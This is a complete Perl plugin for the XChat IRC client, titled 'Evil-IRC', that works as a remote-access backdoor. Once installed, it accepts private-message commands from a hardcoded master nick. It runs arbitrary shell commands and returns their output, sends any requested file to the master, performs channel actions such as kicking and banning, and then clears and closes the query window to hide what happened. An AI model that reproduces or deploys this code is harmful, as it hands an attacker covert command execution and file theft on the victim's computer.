#!/usr/bin/perl
#============================#
#   Evil-IRC by @JoelGMSec   #
#    https://darkbyte.net    #
#============================#

use Xchat qw(:all);
Xchat::register("Evil-IRC", "2.0", "Evil-IRC Script by \@JoelGMSec - https://darkbyte.net");
Xchat::hook_server("PRIVMSG", \&server_handler, Xchat::PRI_HIGHEST);
$master = "NiCK"; # Change to your nick on IRC

my @help = (" .:[ Evil-IRC by \@JoelGMSec ]:. ",
"------ Available commands ------",
"!hi = Say hi to master",
"!help = Show this help message",
"!cmd = Execute command and send output",
"!msg = Send msg in channel or privmsg",
"!join = Join to specific channel",
"!leave = Leave specific channel",
"!op = Op nick in current channel",
"!deop = Deop nick in current channel",
"!ban = Ban nick in current channel",
"!kick = Kick nick in current channel",
"!send = Send specific file to master",
"!clear = Clear current window",
"!close = Close current window",
"!custom = Execute custom IRC command",
"!quit = Exit program");

sub server_handler {
   my ($line) = $_[1][0]; my ($cmd) = $_[1][3]; my ($args) = $_[1][4];
   if ($line =~ m/:(.+?)\!(.+?) PRIVMSG (.*) :(.*)/o) { $nick = $1; }

   if ($nick eq $master) { 
      if ($cmd =~ m/!/) {
         Xchat::command("query $nick");
          
         if ($cmd =~ m/!help/) {
            foreach (@help) { Xchat::command("msg $nick $_", $nick); }} 

         if ($cmd =~ m/!cmd/) {         
            my ($out) = Xchat::command("exec -o $args", $nick); }
         
         if ($cmd =~ m/!hi/) { Xchat::command("msg $nick Hi $nick!", $nick); }
         if ($cmd =~ m/!msg/) { Xchat::command("msg $args"); }
         if ($cmd =~ m/!join/) { Xchat::command("join $args"); }
         if ($cmd =~ m/!leave/) { Xchat::command("part $args"); }
         if ($cmd =~ m/!op/) { Xchat::command("op $args"); }
         if ($cmd =~ m/!deop/) { Xchat::command("deop $args"); }
         if ($cmd =~ m/!ban/) { Xchat::command("ban $args"); }
         if ($cmd =~ m/!kick/) { Xchat::command("kick $args"); }
         if ($cmd =~ m/!send/) { Xchat::command("send $nick $args"); }
         if ($cmd =~ m/!clear/) { Xchat::command("clear $args"); }
         if ($cmd =~ m/!close/) { Xchat::command("close $args"); }
         if ($cmd =~ m/!custom/) { Xchat::command("$args"); }
         if ($cmd =~ m/!quit/) { Xchat::command("quit"); }

         Xchat::command("clear", $nick);
         Xchat::command("close", $nick);
      }
   }
}
